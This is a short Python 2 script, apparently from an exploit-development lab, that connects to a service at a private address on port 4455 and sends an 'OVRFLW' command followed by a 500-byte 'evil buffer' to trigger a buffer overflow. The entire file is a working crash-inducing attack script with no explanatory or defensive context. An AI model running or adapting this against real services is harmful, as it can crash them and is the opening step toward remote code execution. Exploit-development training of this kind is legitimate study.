#!/usr/bin/python

import sys, socket

#if len(sys.argv) < 2:
#    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
#    sys.exit()

host = "172.16.162.166"
port = 4455
buffer = "A" * 500
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect((sys.argv[1], 4455))
s.connect((host,port))
print s.recv(1024)
print "Sending evil buffer of %s bytes" %len(buffer)
s.send("OVRFLW" + buffer)
s.close()



